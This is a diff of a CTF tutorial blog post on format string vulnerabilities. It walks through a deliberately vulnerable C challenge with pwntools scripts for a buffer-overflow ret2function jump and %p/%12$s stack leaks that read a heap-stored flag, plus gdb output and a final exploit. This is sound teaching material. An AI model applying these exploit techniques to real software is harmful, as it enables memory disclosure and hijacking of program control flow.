@@ -10,8 +10,11 @@ Today we are going to learn about format strings. This will be done with a chall
 The challenge files can be found [here](https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/fmtstr/flagleak)
 
 # Analysis
+
 ## Code Analysis
+
 Here's the source code for the challenge.
+
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -53,14 +56,19 @@ int main(int argc, char **argv, char **environ){
 	read(0, buf, 0x60 + 8 + 16);
 }
 ```
-There are three functions _main_, _ignore\_me_ and _print\_flag_. We will ignore _ignore\_me_ as I have already discussed in [first post](/blog/ret2shellcode) what it does. The _main_ prints a line and reads an input in a buffer. But, it reads 0x78 bytes while the buffer can hold only 0x60 bytes. So, we have a buffer overflow. But, this overflow is quite limited to do a complete ROP chain. The _print\_flag_ function opens `flag.txt` and stores its contents in a heap chunk. (heap is just a memory region which is used to store dynamically sized items) Then it prints another line and reads input in a buffer using fgets. There is no overflow here. Then it passes our input to _printf_ function. The way our input is passed to printf gives rise to a format string vulnerability. Then it exits using _exit_ syscall.
+
+There are three functions _main_, _ignore_me_ and _print_flag_. We will ignore _ignore_me_ as I have already discussed in [first post](/blog/ret2shellcode) what it does. The _main_ prints a line and reads an input in a buffer. But, it reads 0x78 bytes while the buffer can hold only 0x60 bytes. So, we have a buffer overflow. But, this overflow is quite limited to do a complete ROP chain. The _print_flag_ function opens `flag.txt` and stores its contents in a heap chunk. (heap is just a memory region which is used to store dynamically sized items) Then it prints another line and reads input in a buffer using fgets. There is no overflow here. Then it passes our input to _printf_ function. The way our input is passed to printf gives rise to a format string vulnerability. Then it exits using _exit_ syscall.
 
 ## What is printf?
+
 _printf_ (PRINT with Format) is a function in C which is used to print stuff to stdout with specific formatting. It has following signature: -
+
 ```c
 int printf(const char *format, ...);
 ```
+
 For example, it you want to print a number along with some text, you can do the following: -
+
 ```c
 #include <stdio.h>
 
@@ -68,14 +76,19 @@ int main(){
     printf("I'm %d years old\n", 10);
 }
 ```
+
 This prints `I'm 10 years old`. The `\n` is called newline, it ends the current line and moves the cursor on next line. `%d` is a format specifier, it is used to specify that a decimal is to be inserted here. So, `%d` is replaced with `10` or whatever number you put. [Here](https://codeforwin.org/2015/05/list-of-all-format-specifiers-in-c-programming.html) is a list of most commonly used format specifiers. For more info on format specifiers, visit [this page](https://en.wikipedia.org/wiki/Printf_format_string#Format_placeholder_specification).
 
 ## What is format string vulnerability?
+
 In this vuln, a user-controlled string is passed as _format_ to formatting functions like printf, fprintf, sprintf etc. Using the formatting language we can leak and overwrite values from/at any arbitrary location (provided some requirements). This way we can execute arbitrary commands.
 
 # Exploitation
+
 ## Checksec
+
 Running checksec on the binary yields the following:
+
 ```
 Arch:     amd64-64-little
 RELRO:    Partial RELRO
@@ -83,10 +96,13 @@ Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
-Since NX is enabled, we will do a ret2function attack to jump to _print\_flag_ function. Then we will perform some format string. I will skip the details for ret2function. If you want, you can read [this](/blog/ret2win) blog.
+
+Since NX is enabled, we will do a ret2function attack to jump to _print_flag_ function. Then we will perform some format string. I will skip the details for ret2function. If you want, you can read [this](/blog/ret2win) blog.
 
 ## ret2func
-The following script makes the program jump to _print\_flag_ function.
+
+The following script makes the program jump to _print_flag_ function.
+
 ```py
 from pwn import *
 
@@ -114,7 +130,9 @@ p.send(payload)
 p.interactive()
 p.close()
 ```
+
 If you get a SEGFAULT by running it then you are facing a 16-byte alignment issue. 64 bit architecture requires RSP to be 16-byte aligned whenever a function is called. To circumvent it, just add a return instruction before the jump.
+
 ```py
 from pwn import *
 
@@ -138,7 +156,7 @@ ret = r.find_gadget(['ret'])[0]
 p.recvline()
 
 payload = b'A'*offset
-payload += p64(ret) 
+payload += p64(ret)
 payload += p64(elf.sym.print_flag)
 
 p.send(payload)
@@ -148,8 +166,10 @@ p.close()
 ```
 
 ## Format string
-Now that we have reached _print\_flag_ function, we will try to leak the flag.
+
+Now that we have reached _print_flag_ function, we will try to leak the flag.
 It is common practice to give a lot of `%p`s or `%x`s to the format string to leak values from the program's stack. The flag is stored in heap. Let's fire gdb to know the general pattern of the heap chunk's address. I'm using [gdb-gef](https://github.com/hugsy/gef). Put a break point after the malloc. To run gdb after the payload, add the following lines before `p.send(payload)`:
+
 ```py
 attach(p, '''
 b *print_flag+43
@@ -157,27 +177,28 @@ continue
 ''')
 input('ATTACHED?')
 ```
+
 ```
 Breakpoint 1, 0x0000000000401210 in print_flag ()
 $rax   : 0x0000000000e782a0  →  0x0000000000000000
-$rbx   : 0x0               
+$rbx   : 0x0
 $rcx   : 0x0000000000e782d0  →  0x0000000000000000
-$rdx   : 0x41              
+$rdx   : 0x41
 $rsp   : 0x00007ffe9b0a53c0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
 $rbp   : 0x00007ffe9b0a5400  →  "AAAAAAAA"
-$rsi   : 0x30              
+$rsi   : 0x30
 $rdi   : 0x0000000000e782a0  →  0x0000000000000000
 $rip   : 0x0000000000401210  →  <print_flag+43> mov QWORD PTR [rbp-0x10], rax
 $r8    : 0x0000000000e782a0  →  0x0000000000000000
 $r9    : 0x00007fe17d9b8be0  →  0x0000000000e782d0  →  0x0000000000000000
-$r10   : 0x2b0             
-$r11   : 0x40              
+$r10   : 0x2b0
+$r11   : 0x40
 $r12   : 0x00000000004010c0  →  <_start+0> xor ebp, ebp
-$r13   : 0x0               
-$r14   : 0x0               
-$r15   : 0x0               
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 0x00007ffe9b0a53c0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
 0x00007ffe9b0a53c8│+0x0008: 0x4141414141414141
 0x00007ffe9b0a53d0│+0x0010: 0x4141414141414141
@@ -199,16 +220,20 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 [#0] Id 1, Name: "flagleak", stopped 0x401210 in print_flag (), reason: BREAKPOINT
 
 [#0] 0x401210 → print_flag()
-gef➤ 
+gef➤
 ```
+
 If you run it multiple times, you will notice that the address returned by malloc (RAX) ends with `2a0`. Now we will try to leak values using `%p`s. Why `%p`? because `%p` will give us the value in hex format, using the architecture's register size. I like to use a python loop like the following to leak values in format string attacks. Here I use direct access method to access any specific offset from the stack. The format is `%(index)$p`.
+
 ```py
 for i in range(1, 30):
     p.sendline(f'%{i}$p')
     leak = p.recvline(False)
     print(i, leak)
 ```
+
 In this case I had to do the following because the program exits after the format string.
+
 ```py
 #!/usr/bin/env python3
 from pwn import *
@@ -232,8 +257,8 @@ for i in range(1, 30):
     start()
     p.recvline()
 
-    payload = b'A'*offset 
-    payload += p64(ret) 
+    payload = b'A'*offset
+    payload += p64(ret)
     payload += p64(elf.sym.print_flag)
 
     p.send(payload)
@@ -249,7 +274,9 @@ for i in range(1, 30):
 p.interactive()
 p.close()
 ```
+
 This gives the following:
+
 ```
 1 b'0x7f08e8bdca03'
 2 b'(nil)'
@@ -281,10 +308,14 @@ This gives the following:
 28 b'(nil)'
 29 b'0x1'
 ```
+
 If you look closely, the value on position (offset) 12 ends with `2a0`. This is our target. It's the address at which flag is stored. Now to read the contents of this address, we will use `%s`. This will print the flag as a string. But, we need to directly access the 12th offset, so we will use `%12$s`.
 And BOOM!. You get the flag.
+
 ## Final exploit
+
 Here is the final script
+
 ```py
 #!/usr/bin/env python3
 from pwn import *
@@ -307,8 +338,8 @@ ret = r.find_gadget(['ret'])[0]
 
 p.recvline()
 
-payload = b'A'*0x68 
-payload += p64(ret) 
+payload = b'A'*0x68
+payload += p64(ret)
 payload += p64(elf.sym.print_flag)
 
 p.send(payload)
@@ -319,4 +350,5 @@ print(p.recvlines(2)[-1].decode())
 
 p.close()
 ```
+
 If you have any doubts/questions/suggestions, contact me on twitter @stdnoerr or discord stdnoerr#7880.
